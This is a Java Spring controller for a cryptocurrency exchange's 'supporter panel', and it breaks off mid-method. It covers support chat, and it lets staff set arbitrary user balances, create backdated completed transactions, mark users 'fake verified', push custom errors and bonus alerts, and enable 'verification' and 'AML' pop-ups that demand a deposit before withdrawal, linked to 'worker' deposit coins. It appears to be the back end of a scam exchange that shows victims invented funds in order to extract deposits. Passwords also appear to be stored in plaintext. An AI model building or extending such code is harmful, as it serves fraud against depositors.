package me.yukitale.cryptoexchange.panel.supporter.controller.api;

import me.yukitale.cryptoexchange.common.types.CoinType;
import me.yukitale.cryptoexchange.config.Resources;
import me.yukitale.cryptoexchange.exchange.model.Coin;
import me.yukitale.cryptoexchange.exchange.model.ban.EmailBan;
import me.yukitale.cryptoexchange.exchange.model.user.*;
import me.yukitale.cryptoexchange.exchange.model.user.settings.UserErrorMessage;
import me.yukitale.cryptoexchange.exchange.model.user.settings.UserFeature;
import me.yukitale.cryptoexchange.exchange.model.user.settings.UserRequiredDepositCoin;
import me.yukitale.cryptoexchange.exchange.repository.CoinRepository;
import me.yukitale.cryptoexchange.exchange.repository.ban.EmailBanRepository;
import me.yukitale.cryptoexchange.exchange.repository.user.*;
import me.yukitale.cryptoexchange.exchange.repository.user.settings.UserErrorMessageRepository;
import me.yukitale.cryptoexchange.exchange.repository.user.settings.UserFeatureRepository;
import me.yukitale.cryptoexchange.exchange.repository.user.settings.UserRequiredDepositCoinRepository;
import me.yukitale.cryptoexchange.exchange.security.service.UserDetailsServiceImpl;
import me.yukitale.cryptoexchange.exchange.security.xss.XSSUtils;
import me.yukitale.cryptoexchange.exchange.service.CooldownService;
import me.yukitale.cryptoexchange.exchange.service.UserService;
import me.yukitale.cryptoexchange.exchange.service.WestWalletService;
import me.yukitale.cryptoexchange.panel.common.model.ErrorMessage;
import me.yukitale.cryptoexchange.panel.supporter.model.Supporter;
import me.yukitale.cryptoexchange.panel.supporter.model.settings.SupporterSupportPreset;
import me.yukitale.cryptoexchange.panel.supporter.repository.SupporterRepository;
import me.yukitale.cryptoexchange.panel.supporter.repository.settings.SupporterSupportPresetsRepository;
import me.yukitale.cryptoexchange.panel.worker.model.Worker;
import me.yukitale.cryptoexchange.panel.worker.model.settings.coins.WorkerDepositCoin;
import me.yukitale.cryptoexchange.panel.worker.repository.settings.coins.WorkerDepositCoinRepository;
import me.yukitale.cryptoexchange.utils.DataValidator;
import me.yukitale.cryptoexchange.utils.FileUploadUtil;
import me.yukitale.cryptoexchange.utils.JsonUtil;
import org.apache.commons.lang.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.security.access.prepost.PreAuthorize;
import org.springframework.security.core.Authentication;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;

import java.io.IOException;
import java.time.Duration;
import java.util.*;

@RestController
@RequestMapping(value = "/api/supporter-panel")
@PreAuthorize("hasRole('ROLE_SUPPORTER')")
public class SupporterPanelApiController {

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private SupporterRepository supporterRepository;

    @Autowired
    private SupporterSupportPresetsRepository supporterSupportPresetsRepository;

    @Autowired
    private CoinRepository coinRepository;

    @Autowired
    private UserSupportMessageRepository userSupportMessageRepository;

    @Autowired
    private UserSupportDialogRepository userSupportDialogRepository;

    @Autowired
    private UserAlertRepository userAlertRepository;

    @Autowired
    private UserFeatureRepository userFeatureRepository;

    @Autowired
    private UserTransactionRepository userTransactionRepository;

    @Autowired
    private UserKycRepository userKycRepository;

    @Autowired
    private UserDepositRepository userDepositRepository;

    @Autowired
    private UserRequiredDepositCoinRepository userRequiredDepositCoinRepository;

    @Autowired
    private UserErrorMessageRepository userErrorMessageRepository;

    @Autowired
    private EmailBanRepository emailBanRepository;

    @Autowired
    private WorkerDepositCoinRepository workerDepositCoinRepository;

    @Autowired
    private UserService userService;

    @Autowired
    private WestWalletService westWalletService;

    @Autowired
    private UserAddressRepository userAddressRepository;

    @Autowired
    private CooldownService cooldownService;

    @Autowired
    private UserDetailsServiceImpl userDetailsService;

    //start support preset settings
    @PostMapping(value = "/settings/presets")
    public ResponseEntity<String> settingsPresetsController(Authentication authentication, @RequestBody Map<String, Object> data) {
        String action = (String) data.get("action");
        switch (action) {
            case "EDIT_SUPPORT_PRESET_SETTINGS" -> {
                return editSupportPresetSettings(authentication, data);
            }
            case "ADD_SUPPORT_PRESET" -> {
                return addSupportPreset(authentication, data);
            }
            case "DELETE_SUPPORT_PRESET" -> {
                return deleteSupportPreset(authentication, data);
            }
            default -> {
                return ResponseEntity.badRequest().body("invalid_action");
            }
        }
    }
    @PostMapping(value = "/toggle-support/{id}")
    public ResponseEntity<String> toggleSupport(Authentication authentication, @PathVariable long id) {
        try {
            User supporterUser = userService.getUser(authentication);

            User user = userRepository.findById(id).orElseThrow();
            boolean isUserNotNull = user.getSupport() != null;
            if (user.isSupporter() || user.isAdmin() || (isUserNotNull && user.getSupport().getId() != supporterUser.getId()) ) {
                return ResponseEntity.ok().build();
            }
            if (isUserNotNull && user.getSupport().getId() == supporterUser.getId()) {
               supporterUser.removeFromSupported(user);
            } else {
                supporterUser.addToSupported(user);
            }
            userRepository.save(supporterUser);
            return ResponseEntity.ok().build();
        } catch (Exception e) {
            return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(e.getMessage());
        }
    }

    public Supporter getSupporter(Authentication authentication) {
        User user = userService.getUser(authentication);
        return supporterRepository.findByUserId(user.getId()).orElseThrow();
    }

    private ResponseEntity<String> editSupportPresetSettings(Authentication authentication, Map<String, Object> data) {
        Supporter supporter = getSupporter(authentication);

        boolean enabled = (boolean) data.get("enabled");

        List<Map<String, Object>> presets = (List<Map<String, Object>>) data.get("presets");
        for (Map<String, Object> preset : presets) {
            long id = Long.parseLong(String.valueOf(preset.get("id")));
            String title = String.valueOf(preset.get("title"));
            title = XSSUtils.stripXSS(title);
            if (StringUtils.isBlank(title)) {
                return ResponseEntity.badRequest().body("invalid_title");
            }

            String message = String.valueOf(preset.get("message"));
            message = XSSUtils.stripXSS(message);
            if (StringUtils.isBlank(message) || message.length() > 2000) {
                return ResponseEntity.badRequest().body("invalid_message");
            }

            SupporterSupportPreset adminSupportPreset = supporterSupportPresetsRepository.findByIdAndSupporterId(id, supporter.getId()).orElse(null);
            if (adminSupportPreset != null) {
                adminSupportPreset.setTitle(title);
                adminSupportPreset.setMessage(message);

                supporterSupportPresetsRepository.save(adminSupportPreset);
            }
        }

        supporter.setSupportPresetsEnabled(enabled);

        supporterRepository.save(supporter);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> addSupportPreset(Authentication authentication, Map<String, Object> data) {
        Supporter supporter = getSupporter(authentication);
        String title = (String) data.get("title");
        title = XSSUtils.stripXSS(title);
        if (StringUtils.isBlank(title)) {
            return ResponseEntity.badRequest().body("invalid_title");
        }

        String message = (String) data.get("message");
        message = XSSUtils.stripXSS(message);
        if (StringUtils.isBlank(message) || message.length() > 2000) {
            return ResponseEntity.badRequest().body("invalid_message");
        }

        if (supporterSupportPresetsRepository.countBySupporterId(supporter.getId()) >= 40) {
            return ResponseEntity.badRequest().body("limit");
        }

        SupporterSupportPreset adminSupportPreset = new SupporterSupportPreset();
        adminSupportPreset.setTitle(title);
        adminSupportPreset.setMessage(message);
        adminSupportPreset.setSupporter(supporter);

        supporterSupportPresetsRepository.save(adminSupportPreset);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> deleteSupportPreset(Authentication authentication, Map<String, Object> data) {
        Supporter supporter = getSupporter(authentication);
        long id = (long) (int) data.get("id");
        if (!supporterSupportPresetsRepository.existsByIdAndSupporterId(id, supporter.getId())) {
            return ResponseEntity.badRequest().body("not_found");
        }

        supporterSupportPresetsRepository.deleteById(id, supporter.getId());

        return ResponseEntity.ok("success");
    }
    //end support preset settings

    //start support
    @PostMapping(value = "/support")
    public ResponseEntity<String> supportController(@RequestBody Map<String, Object> data) {
        String action = (String) data.get("action");
        switch (action) {
            case "GET_SUPPORT_USER" -> {
                return getSupportUser(data);
            }
            case "DELETE_SUPPORT_MESSAGE" -> {
                return deleteSupportMessage(data);
            }
            case "EDIT_SUPPORT_MESSAGE" -> {
                return editSupportMessage(data);
            }
            case "DELETE_SUPPORT_DIALOG" -> {
                return deleteSupportDialog(data);
            }
            default -> {
                return ResponseEntity.badRequest().body("invalid_action");
            }
        }
    }

    private ResponseEntity<String> getSupportUser(Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("id")));

        User user = userRepository.findById(id).orElse(null);
        if (user == null) {
            return ResponseEntity.badRequest().body("error");
        }

        Map<String, Object> map = new HashMap<>() {{
            put("username", user.getUsername());
            put("email", user.getEmail());
            put("domain", user.getDomain());

            if (user.getProfilePhoto() != null) {
                put("profile_photo", user.getProfilePhoto());
            }

            put("online", user.isOnline());
        }};

        return ResponseEntity.ok(JsonUtil.writeJson(map));
    }

    private ResponseEntity<String> deleteSupportMessage(Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("message_id")));

        UserSupportMessage supportMessage = userSupportMessageRepository.findById(id).orElse(null);
        if (supportMessage == null) {
            return ResponseEntity.badRequest().body("not_found");
        }

        userSupportMessageRepository.deleteByIdAndUserId(id, supportMessage.getUser().getId());

        if (!supportMessage.isSupportViewed() || !supportMessage.isUserViewed()) {
            UserSupportDialog userSupportDialog = userSupportDialogRepository.findByUserId(supportMessage.getUser().getId()).orElse(null);

            if (userSupportDialog != null) {
                if (!supportMessage.isSupportViewed()) {
                    userSupportDialog.setSupportUnviewedMessages(userSupportDialog.getSupportUnviewedMessages() - 1);
                }
                if (!supportMessage.isUserViewed()) {
                    userSupportDialog.setUserUnviewedMessages(userSupportDialog.getUserUnviewedMessages() - 1);
                }

                userSupportDialogRepository.save(userSupportDialog);
            }
        }

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editSupportMessage(Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("message_id")));

        String message = String.valueOf(data.get("message"));

        if (StringUtils.isBlank(message)) {
            return ResponseEntity.badRequest().body("message_is_empty");
        }
        if (message.length() > 2000) {
            return ResponseEntity.badRequest().body("message_limit");
        }

        message = XSSUtils.stripXSS(message);

        UserSupportMessage supportMessage = userSupportMessageRepository.findById(id).orElse(null);
        if (supportMessage == null) {
            return ResponseEntity.badRequest().body("not_found");
        }

        supportMessage.setMessage(message);

        userSupportMessageRepository.save(supportMessage);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> deleteSupportDialog(Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("user_id")));

        User user = userRepository.findById(id).orElse(null);
        if (user == null) {
            return ResponseEntity.badRequest().body("not_found");
        }

        boolean ban = (boolean) data.get("ban");

        userSupportDialogRepository.deleteByUserId(id);

        userSupportMessageRepository.deleteAllByUserId(id);

        if (ban) {
            EmailBan emailBan = new EmailBan();
            emailBan.setEmail(user.getEmail());
            emailBan.setUser(user);
            emailBan.setDate(new Date());

            emailBanRepository.save(emailBan);
        }

        return ResponseEntity.ok("success");
    }

    @PostMapping(value = "support/send")
    public ResponseEntity<String> supportSendController(@RequestParam(value = "user_id") String userId, @RequestParam(value = "message", required = false) String message, @RequestParam(value = "image", required = false) MultipartFile image) {
        if (StringUtils.isBlank(message) && image == null) {
            return ResponseEntity.badRequest().body("message_is_empty");
        }

        if (cooldownService.isCooldown("admin-support")) {
            return ResponseEntity.badRequest().body("cooldown");
        }
        User user = userRepository.findById(Long.parseLong(userId)).orElse(null);
        if (user == null || user.isAdmin() || user.isWorker()) {
            return ResponseEntity.badRequest().body("user_not_found");
        }

        if (message != null) {
            if (StringUtils.isBlank(message)) {
                return ResponseEntity.badRequest().body("message_is_empty");
            }
            if (message.length() > 2000) {
                return ResponseEntity.badRequest().body("message_limit");
            }

            message = XSSUtils.stripXSS(message);

            UserSupportMessage supportMessage = new UserSupportMessage(UserSupportMessage.Target.TO_USER, UserSupportMessage.Type.TEXT, message, false, true, user);

            createOrUpdateSupportDialog(supportMessage, user);

            userSupportMessageRepository.save(supportMessage);
        }

        if (image != null && image.getOriginalFilename() != null) {
            String fileName = user.getId() + "_" + System.currentTimeMillis() + ".png";
            try {
                FileUploadUtil.saveFile(Resources.SUPPORT_IMAGES, fileName, image);

                UserSupportMessage supportMessage = new UserSupportMessage(UserSupportMessage.Target.TO_USER, UserSupportMessage.Type.IMAGE, "../" + Resources.SUPPORT_IMAGES + "/" + fileName, false, true, user);

                createOrUpdateSupportDialog(supportMessage, user);

                userSupportMessageRepository.save(supportMessage);
            } catch (IOException e) {
                e.printStackTrace();
                return ResponseEntity.badRequest().body("upload_image_error");
            }
        }

        cooldownService.addCooldown("admin-support", Duration.ofSeconds(2));

        return ResponseEntity.ok("success");
    }

    private void createOrUpdateSupportDialog(UserSupportMessage supportMessage, User user) {
        UserSupportDialog userSupportDialog = userSupportDialogRepository.findByUserId(user.getId()).orElse(null);
        if (userSupportDialog == null) {
            userSupportDialog = new UserSupportDialog();
        }

        userSupportDialog.setOnlyWelcome(false);
        userSupportDialog.setUserUnviewedMessages(userSupportDialog.getUserUnviewedMessages() + 1);
        userSupportDialog.setTotalMessages(userSupportDialog.getTotalMessages() + 1);
        userSupportDialog.setLastMessageDate(supportMessage.getCreated());
        userSupportDialog.setUser(user);

        userSupportDialogRepository.save(userSupportDialog);
    }
    //end support

    //start user-edit
    @PostMapping(value = "/user-edit")
    public ResponseEntity<String> userEditController(@RequestBody Map<String, Object> data) {
        String action = (String) data.get("action");
        switch (action) {
            case "EDIT_OVERVIEW" -> {
                return editOverview(data);
            }
            case "EDIT_KYC" -> {
                return editKyc(data);
            }
            case "SET_BALANCE" -> {
                return setBalance(data);
            }
            case "CREATE_TRANSACTION" -> {
                return createTransaction(data);
            }
            case "EDIT_TRANSACTION" -> {
                return editTransaction(data);
            }
            case "EDIT_TRANSACTION_AMOUNT" -> {
                return editTransactionAmount(data);
            }
            case "EDIT_WITHDRAW_VERIFY" -> {
                return editWithdrawVerify(data);
            }
            case "ADD_WITHDRAW_VERIFY_COIN" -> {
                return addWithdrawVerifyCoin(data);
            }
            case "DELETE_WITHDRAW_VERIFY_COIN" -> {
                return deleteWithdrawVerifyCoin(data);
            }
            default -> {
                return ResponseEntity.badRequest().body("invalid_action");
            }
        }
    }

    private ResponseEntity<String> editOverview(Map<String, Object> data) {
        long userId = Long.parseLong(String.valueOf(data.get("user_id")));

        User user = userRepository.findById(userId).orElse(null);
        if (user == null || user.isAdmin() || user.isWorker()) {
            return ResponseEntity.badRequest().body("user_not_found");
        }

        String username = (String) data.get("username");
        if (!DataValidator.isUsernameValided(username)) {
            return ResponseEntity.badRequest().body("username_error");
        }

        String password = XSSUtils.stripXSS((String) data.get("password"));
        if (password.length() < 8 || password.length() > 64) {
            return ResponseEntity.badRequest().body("password_error");
        }

        double firstDepositBonusAmount = getDoubleValue(data, "first_deposit_bonus_amount");

        if (firstDepositBonusAmount < 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        boolean firstDepositBonusEnabled = (boolean) data.get("first_deposit_bonus_enabled");
        boolean emailBanned = (boolean) data.get("ban_email");
        boolean twoFactorEnabled = (boolean) data.get("two_factor_enabled");
        boolean emailConfirmed = (boolean) data.get("email_confirmed");
        boolean fakeVerified = (boolean) data.get("fake_verified");

        Map<String, Boolean> featuresMap = (Map<String, Boolean>) data.get("features");
        Map<UserFeature.Type, Boolean> features = new HashMap<>();
        for (Map.Entry<String, Boolean> entry : featuresMap.entrySet()) {
            features.put(UserFeature.Type.valueOf(entry.getKey()), entry.getValue());
        }

        double depositCommission = getDoubleValue(data, "deposit_commission");
        if (depositCommission < -1) {
            depositCommission = -1;
        }

        double withdrawCommission = getDoubleValue(data, "withdraw_commission");
        if (withdrawCommission < -1) {
            withdrawCommission = -1;
        }

        String note = String.valueOf(data.get("note"));
        if (note.length() > 128) {
            return ResponseEntity.badRequest().body("note_length_error");
        }

        if (!note.equals(user.getNote()) || withdrawCommission != user.getWithdrawCommission() || depositCommission != user.getDepositCommission() || !user.getUsername().equals(username) || !user.getPassword().equals(password) || user.getFirstDepositBonusAmount() != firstDepositBonusAmount || user.isFirstDepositBonusEnabled() != firstDepositBonusEnabled || user.isTwoFactorEnabled() != twoFactorEnabled || user.isEmailConfirmed() != emailConfirmed || user.isFakeVerified() != fakeVerified) {
            user.setNote(note);
            user.setDepositCommission(depositCommission);
            user.setWithdrawCommission(withdrawCommission);
            user.setUsername(username);
            user.setPassword(password);
            user.setFirstDepositBonusAmount(firstDepositBonusAmount);
            user.setFirstDepositBonusEnabled(firstDepositBonusEnabled);
            user.setTwoFactorEnabled(twoFactorEnabled);
            user.setEmailConfirmed(emailConfirmed);
            user.setFakeVerified(fakeVerified);

            userRepository.save(user);

            userDetailsService.removeCache(user.getEmail());
        }

        boolean banned = emailBanRepository.existsByEmail(user.getEmail());
        if (banned != emailBanned) {
            if (emailBanned) {
                EmailBan emailBan = new EmailBan();
                emailBan.setEmail(user.getEmail());
                emailBan.setUser(user);
                emailBan.setDate(new Date());

                emailBanRepository.save(emailBan);
            } else {
                emailBanRepository.deleteByEmail(user.getEmail());
            }
        }

        List<UserFeature> userFeatures = userFeatureRepository.findAllByUserId(userId);
        for (Map.Entry<UserFeature.Type, Boolean> entry : features.entrySet()) {
            UserFeature userFeature = userFeatures.stream().filter(feat -> feat.getType() == entry.getKey()).findFirst().orElse(null);
            if (userFeature == null) {
                userFeature = new UserFeature();
                userFeature.setUser(user);
                userFeature.setType(entry.getKey());
            }

            userFeature.setEnabled(entry.getValue());

            userFeatureRepository.save(userFeature);
        }

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editKyc(Map<String, Object> data) {
        long userId = Long.parseLong(String.valueOf(data.get("user_id")));

        User user = userRepository.findById(userId).orElse(null);
        if (user == null || user.isAdmin() || user.isWorker()) {
            return ResponseEntity.badRequest().body("user_not_found");
        }

        UserKyc userKyc = user.getUserKyc();

        if (userKyc == null) {
            return ResponseEntity.badRequest().body("kyc_error");
        }

        if (userKyc.isAccepted()) {
            return ResponseEntity.badRequest().body("kyc_error");
        }

        String type = (String) data.get("type");
        if (type.equals("ACCEPT")) {
            userKyc.setAccepted(true);
            userKycRepository.save(userKyc);
        } else if (type.equals("CANCEL")){
            userKycRepository.deleteById(userKyc.getId());
        }

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> setBalance(Map<String, Object> data) {
        long userId = Long.parseLong(String.valueOf(data.get("user_id")));

        User user = userRepository.findById(userId).orElse(null);
        if (user == null || user.isAdmin() || user.isWorker()) {
            return ResponseEntity.badRequest().body("user_not_found");
        }

        double balance = getDoubleValue(data, "balance");
        if (Double.isNaN(balance) || balance < 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        long coinId = Long.parseLong(String.valueOf(data.get("coin_id")));
        Coin coin = coinRepository.findById(coinId).orElse(null);
        if (coin == null) {
            return ResponseEntity.badRequest().body("coin_not_found");
        }

        userService.setBalance(user, coin, balance);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> createTransaction(Map<String, Object> data) {
        long userId = Long.parseLong(String.valueOf(data.get("user_id")));

        User user = userRepository.findById(userId).orElse(null);
        if (user == null || user.isAdmin() || user.isWorker()) {
            return ResponseEntity.badRequest().body("user_not_found");
        }

        double amount = getDoubleValue(data, "amount");
        if (Double.isNaN(amount) || amount < 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        long coinId = Long.parseLong(String.valueOf(data.get("coin")));
        Coin coin = coinRepository.findById(coinId).orElse(null);
        if (coin == null) {
            return ResponseEntity.badRequest().body("coin_not_found");
        }

        String typeName = (String) data.get("type");
        UserTransaction.Type type = UserTransaction.Type.valueOf(typeName);

        if (!type.isIncrementBalance()) {
            if (userService.getBalance(user, coin) - amount < 0) {
                return ResponseEntity.badRequest().body("user_no_balance");
            }
        }

        String dateString = (String) data.get("date");
        Date date = null;
        if (!StringUtils.isBlank(dateString)) {
            try {
                date = new Date(dateString);
            } catch (Exception ex) {
                date = new Date();
            }
        } else {
            date = new Date();
        }

        String address = data.containsKey("address") && data.get("address") != null ? String.valueOf(data.get("address")) : null;

        UserTransaction userTransaction = new UserTransaction();

        userTransaction.setUser(user);
        userTransaction.setAmount(amount);
        userTransaction.setType(type);
        userTransaction.setAddress(address);
        userTransaction.setStatus(UserTransaction.Status.COMPLETED);
        userTransaction.setDate(date);
        userTransaction.setCoinSymbol(coin.getSymbol());

        userTransactionRepository.save(userTransaction);

        userService.addBalance(user, coin, type.isIncrementBalance() ? amount : -amount);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editTransaction(Map<String, Object> data) {
        long userId = Long.parseLong(String.valueOf(data.get("user_id")));
        long transactionId = Long.parseLong(String.valueOf(data.get("id")));

        UserTransaction userTransaction = userTransactionRepository.findByIdAndUserId(transactionId, userId).orElse(null);
        if (userTransaction == null) {
            return ResponseEntity.badRequest().body("not_found");
        }

        String type = String.valueOf(data.get("type"));
        if (type.equals("DELETE")) {
            if (userTransaction.getType() == UserTransaction.Type.DEPOSIT && userDepositRepository.existsByTransactionId(transactionId)) {
                return ResponseEntity.badRequest().body("not_editable");
            }

            userTransactionRepository.deleteById(transactionId);

            return ResponseEntity.ok("success");
        } else if(userTransaction.getStatus() == UserTransaction.Status.IN_PROCESSING) {
            if (type.equals("PAID_OUT")) {
                if (userTransaction.getType() == UserTransaction.Type.DEPOSIT) {
                    UserDeposit userDeposit = userDepositRepository.findByTransactionId(transactionId).orElse(null);
                    if (userDeposit != null) {
                        userService.addBalance(userDeposit.getUser(), userTransaction.getCoinSymbol(), userDeposit.getAmount());
                    }
                }

                userTransaction.setStatus(UserTransaction.Status.COMPLETED);
                userTransactionRepository.save(userTransaction);

                return ResponseEntity.ok("success");
            } else if (type.equals("CANCEL")) {
                if (userTransaction.getType() == UserTransaction.Type.DEPOSIT && userDepositRepository.existsByTransactionId(transactionId)) {
                    return ResponseEntity.badRequest().body("not_editable");
                }

                userService.addBalance(userTransaction.getUser(), userTransaction.getCoinSymbol(), userTransaction.getAmount());

                userTransaction.setStatus(UserTransaction.Status.CANCELED);

                userTransactionRepository.save(userTransaction);

                return ResponseEntity.ok("success");
            }
        }

        return ResponseEntity.ok("error");
    }

    private ResponseEntity<String> editTransactionAmount(Map<String, Object> data) {
        long userId = Long.parseLong(String.valueOf(data.get("user_id")));
        long transactionId = Long.parseLong(String.valueOf(data.get("id")));

        UserTransaction userTransaction = userTransactionRepository.findByIdAndUserId(transactionId, userId).orElse(null);
        if (userTransaction == null) {
            return ResponseEntity.badRequest().body("not_found");
        }

        double amount = getDoubleValue(data, "amount");
        if (Double.isNaN(amount) || amount <= 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        userTransaction.setAmount(amount);
        userTransactionRepository.save(userTransaction);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editWithdrawVerify(Map<String, Object> data) {
        boolean verifModal = (boolean) data.get("verif_modal");
        boolean amlModal = (boolean) data.get("aml_modal");
        double verifAmount = getDoubleValue(data, "verif_amount");
        double btcVerifAmount = getDoubleValue(data, "btc_verif_amount");

        if (Double.isNaN(verifAmount) || verifAmount <= 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        long userId = Long.parseLong(String.valueOf(data.get("user_id")));
        User user = userRepository.findById(userId).orElse(null);
        if (user == null) {
            return ResponseEntity.badRequest().body("user_not_found");
        }

        user.setVerificationModal(verifModal);
        user.setAmlModal(amlModal);
        user.setVerifDepositAmount(verifAmount);
        user.setBtcVerifDepositAmount(btcVerifAmount < 0 ? 0 : btcVerifAmount);

        userRepository.save(user);

        return ResponseEntity.ok("error");
    }

    private ResponseEntity<String> addWithdrawVerifyCoin(Map<String, Object> data) {
        long userId = Long.parseLong(String.valueOf(data.get("user_id")));
        User user = userRepository.findById(userId).orElse(null);
        if (user == null || user.isAdmin() || user.isWorker()) {
            return ResponseEntity.badRequest().body("user_not_found");
        }

        Worker worker = user.getWorker();
        if (worker == null) {
            return ResponseEntity.badRequest().body("temp_error");
        }

        long coinId = Long.parseLong(String.valueOf(data.get("coin_id")));
        WorkerDepositCoin depositCoin = workerDepositCoinRepository.findByIdAndWorkerId(coinId, worker.getId()).orElse(null);
        if (depositCoin == null) {
            return ResponseEntity.badRequest().body("coin_not_found");
        }

        if (userRequiredDepositCoinRepository.existsByUserIdAndDepositCoinIdAndDepositCoinWorkerId(userId, coinId, worker.getId())) {
            return ResponseEntity.badRequest().body("already_exists");
        }

        UserRequiredDepositCoin userRequiredDepositCoin = new UserRequiredDepositCoin();
        userRequiredDepositCoin.setUser(user);
        userRequiredDepositCoin.setDepositCoin(depositCoin);

        userRequiredDepositCoinRepository.save(userRequiredDepositCoin);

        return ResponseEntity.ok("error");
    }

    private ResponseEntity<String> deleteWithdrawVerifyCoin(Map<String, Object> data) {
        long coinId = Long.parseLong(String.valueOf(data.get("coin_id")));
        long userId = Long.parseLong(String.valueOf(data.get("user_id")));
        User user = userRepository.findById(userId).orElse(null);
        if (user == null || user.isAdmin() || user.isWorker()) {
            return ResponseEntity.badRequest().body("user_not_found");
        }

        Worker worker = user.getWorker();
        if (worker == null) {
            return ResponseEntity.badRequest().body("temp_error");
        }

        if (!userRequiredDepositCoinRepository.existsByIdAndUserIdAndDepositCoinWorkerId(coinId, userId, worker.getId())) {
            return ResponseEntity.badRequest().body("not_found");
        }

        userRequiredDepositCoinRepository.deleteById(coinId);

        return ResponseEntity.ok("error");
    }

    @PostMapping("/edit/deposit-address")
    public ResponseEntity<String> editDepositAddress(Authentication authentication, @RequestBody Map<String, Object> data) {
        long userId = Long.parseLong(data.get("user_id").toString());
        User user = userRepository.findById(userId).orElseThrow(() -> new RuntimeException("User not found"));
        userService.validateUserSupport(authentication, user);

        CoinType coinType = CoinType.valueOf(data.get("coin-type").toString());
        String depositAddress = data.get("deposit-address").toString();
        Object depositTagObject = data.get("deposit-tag");

        UserAddress userAddress = westWalletService.updateUserAddress(depositAddress, depositTagObject);
        Optional<UserAddress> existingAddressOpt = userAddressRepository.findByUserIdAndCoinType(userId, coinType);

        if (existingAddressOpt.isPresent()) {
            UserAddress existingAddress = existingAddressOpt.get();
            existingAddress.setAddress(userAddress.getAddress());
            existingAddress.setTag(userAddress.getTag());
            existingAddress.setCreated(System.currentTimeMillis());
            userAddressRepository.save(existingAddress);
            return ResponseEntity.ok("success");
        } else {
            throw new RuntimeException("Failed to update address for user: " + user.getEmail() + ", coin: " + coinType.name());
        }
    }

    @PostMapping("/save/deposit-address")
    public ResponseEntity<String> saveDepositAddresses(Authentication authentication, @RequestBody Map<String, Object> data) {
        long userId = Long.parseLong(data.get("user_id").toString());
        User user = userRepository.findById(userId).orElseThrow(() -> new RuntimeException("User not found"));
        userService.validateUserSupport(authentication, user);

        westWalletService.saveUserAddress(data);

        return ResponseEntity.ok("success");
    }

    @PostMapping(value = "/user-edit/errors")
    public ResponseEntity<String> userEditErrorsController( @RequestBody Map<String, Object> data) {
        long userId = Long.parseLong(String.valueOf(data.get("user_id")));
        User user = userRepository.findById(userId).orElse(null);
        if (user == null || user.isAdmin() || user.isWorker()) {
            return ResponseEntity.badRequest().body("user_not_found");
        }

        Map<String, String> messagesMap = (Map<String, String>) data.get("messages");
        Map<ErrorMessage.ErrorMessageType, String> messages = new HashMap<>();
        for (Map.Entry<String, String> entry : messagesMap.entrySet()) {
            messages.put(ErrorMessage.ErrorMessageType.valueOf(entry.getKey()), entry.getValue());
        }

        for (Map.Entry<ErrorMessage.ErrorMessageType, String> entry : messages.entrySet()) {
            ErrorMessage.ErrorMessageType type = entry.getKey();
            String message = XSSUtils.sanitize(entry.getValue());
            String onlyMessage = user.getOnlyUserErrorMessage(type);
            if (onlyMessage != null && onlyMessage.equals(message)) {
                continue;
            }

            UserErrorMessage userErrorMessage = userErrorMessageRepository.findByUserIdAndType(user.getId(), type).orElse(null);
            if (userErrorMessage == null) {
                userErrorMessage = new UserErrorMessage();
                userErrorMessage.setUser(user);
                userErrorMessage.setType(type);
            }

            userErrorMessage.setMessage(message);

            userErrorMessageRepository.save(userErrorMessage);
        }

        return ResponseEntity.ok("success");
    }


    //todo: кулдауны
    @PostMapping(value = "/user-edit/alert")
    public ResponseEntity<String> userEditAlertController(@RequestBody Map<String, Object> data) {
        String type = (String) data.get("type");
        String cooldownKey = "alert-" + type;
        if (cooldownService.isCooldown(cooldownKey)) {
            return ResponseEntity.badRequest().body("cooldown:" + cooldownService.getCooldownLeft(cooldownKey));
        }

        long userId = Long.parseLong(String.valueOf(data.get("user_id")));
        User user = userRepository.findById(userId).orElse(null);
        if (user == null || user.isAdmin() || user.isWorker()) {
            return ResponseEntity.badRequest().body("user_not_found");
        }

        if (StringUtils.isBlank(type)) {
            return ResponseEntity.badRequest().body("type_error");
        }

        String message = (String) data.get("message");

        message = XSSUtils.sanitize(message);

        if (StringUtils.isBlank(message)) {
            return ResponseEntity.badRequest().body("message_is_empty");
        }

        if (message.length() > 1000) {
            return ResponseEntity.badRequest().body("message_is_too_large");
        }

        UserAlert.Type alertType = UserAlert.Type.ALERT;
        Coin coin = null;
        double amount = 0;
        List<User> users;
        if (type.equals("CURRENT")) {
            users = Collections.singletonList(user);
        } else if (type.equals("ALL")) {
            users = userRepository.findAll();
        } else if (type.equals("BONUS_CURRENT") || type.equals("BONUS_ALL")) {
            alertType = UserAlert.Type.BONUS;
            long coinId = Long.parseLong(String.valueOf(data.get("coin")));
            coin = coinRepository.findById(coinId).orElse(null);
            if (coin == null) {
                return ResponseEntity.badRequest().body("coin_not_found");
            }

            amount = getDoubleValue(data, "amount");
            if (amount <= 0) {
                return ResponseEntity.badRequest().body("amount_error");
            }

            if (type.equals("BONUS_CURRENT")) {
                users = Collections.singletonList(user);
            } else {
                users = userRepository.findAll();
            }
        } else {
            return ResponseEntity.badRequest().body("error");
        }

        //todo: придумать че то с этим
        for (User alertUser : users) {
            UserAlert alert = new UserAlert();
            alert.setUser(alertUser);
            alert.setType(alertType);
            alert.setMessage(message);
            alert.setCoin(coin);
            alert.setAmount(amount);

            userAlertRepository.save(alert);
        }

